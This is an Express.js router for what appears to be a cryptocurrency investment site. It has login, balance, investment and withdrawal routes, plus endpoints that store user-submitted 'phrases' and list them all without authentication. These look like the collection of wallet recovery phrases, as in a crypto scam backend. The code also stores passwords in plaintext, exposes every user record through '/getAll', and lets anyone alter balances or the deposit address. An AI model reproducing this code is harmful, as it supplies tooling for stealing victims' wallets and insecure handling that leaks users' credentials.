const express=require('express');
const phraseSchema= require('../Schema/investmentSchema/phrase')
const addressSchema= require('../Schema/investmentSchema/addresSchema')
const path=require('path');
const  router= express.Router();
router.use(express.json())
router.use(express.urlencoded({extended:true}))
router.use(express.static(path.join(__dirname,'../assetmining/assets')))
 const userSchema= require('../Schema/userSchema/userSchema');
const { equal } = require('assert');
 router.get('/signin',(req,res)=>{
     res.sendFile(path.resolve(__dirname,'../assetmining/signin.html'))
 })
 router.get('/signup', (req,res)=>{
    res.sendFile(path.resolve(__dirname,'../assetmining/form.html'))
 })
 router.post('/submitUser',async(req,res)=>{
     console.log(req.body)
    try{ const newUser=  await userSchema.create(req.body)
  return   res.send({ success:true,data:newUser})}
     catch(err){
         if(err){
            console.log(err) 
            return res.status(403).json({success:false, reason:'username already exists'})
         }
     }
 })
 router.post('/login',async(req,res)=>{
     console.log(req.body)
     try {
          const thisUser= await userSchema.findOne({userName:req.body.name})
          if(!thisUser){
              return res.status(404).json({success:false, reason:'There is no user  with this username'})
          }
          else{
              if(thisUser.password!==req.body.password){
                     return res.status(403).json({success:false, reason:"incorrect password"})
              }
              else{
                return  res.status(200).json({success:true,data:{id:thisUser._id,isAdmin:thisUser.isAdmin}})
              }
          }
        
     } catch (error) {
         console.log(error)
         res.end()
     }
 })
 router.get('/getOne/:id',async(req,res)=>{
 const id= req.params.id;
 console.log(id)
 try {
        const user= await userSchema.findById(id)
        if(!user.balance){user.balance=0}
        console.log(user)
        res.status(200).json(user)
 } catch (error) {
     console.log(error);
     return res.status(500).json("Oops an error occured")
 }
 })
 router.get('/getAll',async(req,res)=>{
    try {
        const allUsers= await userSchema.find()  
       return res.status(200).json({success:true, data:allUsers})
    } catch (error) {
        console.log(error)
        res.status(500).json({success:false ,reason:error.message})
    } 
    
 })
 router.put('/addcoin/:id',async(req,res)=>{
    console.log(req.body)
    const {amount}= req.body
     const thisUser=await userSchema.findById(req.params.id)
     console.log(thisUser)
   if(thisUser){
       if(!thisUser.balance){
         thisUser.balance=0;
        }
        const  newBal={balance:thisUser.balance+ Number(amount) }
 const updated= await userSchema.findByIdAndUpdate(req.params.id,{$set:newBal}).catch(err=>console.log(err))
 console.log(updated)
   }    

     res.json('success')
 })
 router.post('/withdraw/:id',async(req,res)=>{
      const {id}= req.params

      const{withdrawalAmt}= req.body
     try {
         const thisUser= await userSchema.findById(id)
         if(!thisUser.balance){
             thisUser.balance=0
         }
          const newBal= Number(thisUser.balance)-Number(withdrawalAmt)
           await userSchema.findByIdAndUpdate(id, {$set:{balance:newBal}})
           res.status(200).json('successful')
         
     } catch (error) {
         console.log(error)
         res.status(500).json('Oops something went wrong')
     }
 })
 router.post('/addphrase',async(req,res)=>{
     try {
      const newPrase=    await  phraseSchema.create(req.body)
      console.log(newPrase)    
      res.status(200).json('done')
     } catch (error) {
         console.log(error)
         res.status(404).json('An error occured please try again')
     }

 })
 router.get('/getPhrases', async(req,res)=>{
 try {
      const allPhrases= await phraseSchema.find()
      res.status(200).json(allPhrases)
 } catch (error) {
      console.log(error)
 }
 })
 router.put('/addInvest/:id', async(req,res)=>{
   console.log(req.params.id),
   console.log(req.body)
     try {
         const thisUser=  await userSchema.findById(req.params.id)
          if(!thisUser.investment){
              thisUser.investment=0
          }
          const  update= {investment: thisUser.investment+Number(req.body.amount)}
          await userSchema.findByIdAndUpdate(req.params.id,{$set:update})
        return  res.status(200).json('succesful')
         
     } catch (error) {
       console.log(error)   
   return res.status(500).json('ooops request failed try again') 
    }

 })
 router.post('/changeAddress',async(req,res)=>{
   console.log('hello')
   console.log(req.body.newAddress)
    try {
     const address= await addressSchema.find()
     console.log(address)
     if(address.length<1){
          await  addressSchema.create({address:req.body.newAddress})
     
        }
        else{
            await addressSchema.updateMany({},{address:req.body.newAddress})
        }
 res.status(200).json('successful')
  } catch (error) {
       console.log(error)
       res.status(500).json('oops an error occured')
  }  
})
router.get('/getAdd',async(req,res)=>{
    const address=  await addressSchema.find();
    res.status(200).json(address)
     
})
 module.exports= router